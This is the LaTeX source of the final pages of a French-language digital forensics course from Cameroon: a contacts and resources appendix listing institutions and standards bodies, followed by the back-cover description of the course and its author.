%% Version  : 1.0 -- novembre 2026
%% ============================================================================
%% Alignée sur les annexes des autres cours de l'auteur (ACSI, INF3226).
%% ============================================================================

\chapter{Contacts et Ressources}
\label{ann:contacts}

Les adresses ci-dessous sont celles des sites institutionnels à la date de
rédaction~; elles sont à vérifier avant usage.

\section*{Institutions}

\begin{tableaucours}{L{4.2cm}L{5.0cm}L{3.2cm}}{%
    \tableauHeader{Institution} &
    \tableauHeader{Rôle dans le cours} &
    \tableauHeader{Site}
}
ANTIC & Sécurité électronique, audits (loi n°~2010/012) & \texttt{www.antic.cm} \\
MINPOSTEL & Tutelle des communications électroniques & \texttt{www.minpostel.gov.cm} \\
INTERPOL & Coopération policière, notices, opérations & \texttt{www.interpol.int} \\
AFRIPOL & Coopération policière de l'Union africaine & \texttt{afripol.africa-union.org} \\
Conseil de l'Europe & Convention de Budapest, programme Octopus & \texttt{www.coe.int} \\
Union africaine & Convention de Malabo & \texttt{au.int} \\
\end{tableaucours}

\section*{Normes et communauté scientifique}

\begin{tableaucours}{L{4.2cm}L{5.0cm}L{3.2cm}}{%
    \tableauHeader{Organisation} &
    \tableauHeader{Ressources} &
    \tableauHeader{Site}
}
ISO & Normes ISO/IEC 2703x & \texttt{www.iso.org} \\
NIST & SP~800-86, 800-101, jeux de données de référence & \texttt{www.nist.gov} \\
DFRWS & Conférences et défis de la recherche forensique & \texttt{dfrws.org} \\
IACR ePrint & Prépublications de cryptographie & \texttt{eprint.iacr.org} \\
FIRST & Équipes de réponse aux incidents & \texttt{www.first.org} \\
\end{tableaucours}

\section*{NDAP SUKULU}

Les fiches d'auto-évaluation et les labs du cours sont disponibles sur NDAP
SUKULU, sous le code SEC4052. NDAP SUKULU est une propriété de MaletYon, mise à la
disposition des étudiants et des praticiens~: \texttt{maletyon@proton.me}.

    % Contacts, organisations, conférences, communautés en ligne.


% --------------------------------------------------------------------------
% ÉLÉMENTS FINAUX
% --------------------------------------------------------------------------
\backmatter

    \printbibliography[heading=bibintoc, title={Références bibliographiques}]

    \printindex
% ==============================================================================
% 4ÈME DE COUVERTURE
% ==============================================================================
\clearpage
\thispagestyle{empty}
\pagecolor{CouleurPrimaire}

\begin{tikzpicture}[remember picture, overlay]
    \fill[CouleurAccent]
        (current page.south west) rectangle
        ([yshift=1.8cm] current page.south east);
    \fill[CouleurAccent]
        ([yshift=-1.4cm] current page.north west) rectangle
        ([yshift=-1.7cm] current page.north east);
\end{tikzpicture}

\vspace*{1.6cm}

\begin{center}
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}\\[1.5ex]
    {\color{white}\Large\bfseries À propos de ce cours}\\[1.5ex]
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}
\end{center}

\vspace{0.6cm}

\begin{center}
\begin{minipage}{0.75\textwidth}
\color{white!85!gray}\setstretch{1.4}
Ce cours constitue le socle méthodologique et juridique de toute pratique
d'investigation numérique. Là où la cybersécurité prévient et détecte
l'incident, l'investigation numérique en établit la preuve~: elle
transforme une trace technique en élément opposable devant une
juridiction.

\medskip

Ce second volume met en œuvre les fondements de l'UE SEC4031~: forensique
des systèmes, des réseaux, des mobiles, du nuage et de l'IoT, OSINT,
rédaction du rapport forensique, anti-forensique, intelligence artificielle,
conteneurs, puis fondements avancés de la cryptographie appliquée à la
preuve numérique.

\medskip

Ancré dans les standards internationaux (ISO/IEC~27037, NIST~SP~800-86,
RFC~3227, ACPO) et le cadre juridique camerounais (Loi~2010/012,
Loi~2024/017, Convention de Budapest, Convention de Malabo), ce support
s'adresse aux étudiants (ingénieurs et master) et aux officiers de
police judiciaire  spécialisés, appelés à conduire des investigations numériques
recevables devant les tribunaux.
\end{minipage}
\end{center}

\vfill

\begin{center}
    {\color{CouleurAccent}\rule{0.7\linewidth}{1.2pt}}\\[1.2ex]
    {\color{white}\large\bfseries MINKA MI NGUIDJOÏ Thierry Emmanuel}\\[0.4ex]
    {\color{white!80!gray}\small
        CISA~·~CISM~·~CGEIT~·~CRISC~·~CDPSE~·~ISO 27001~·~ISO 22301~·~ISO 9001}\\[0.3ex]
    {\color{white!70!gray}\footnotesize\itshape
        Enseignant Chercheur au laboratoire d'Ingénierie Mathématiques et des Systèmes d'Information}\\[0.3ex]
    {\color{white!70!gray}\footnotesize\itshape
        Chercheur~|~Cryptologue~|~Auditeur Senior~|~Expert Judiciaire~|~GRC \& Sécurité de l'Information}\\[1.2ex]
    {\color{CouleurAccent}\rule{0.7\linewidth}{1.2pt}}
\end{center}

\afterpage{\nopagecolor}
\end{document}

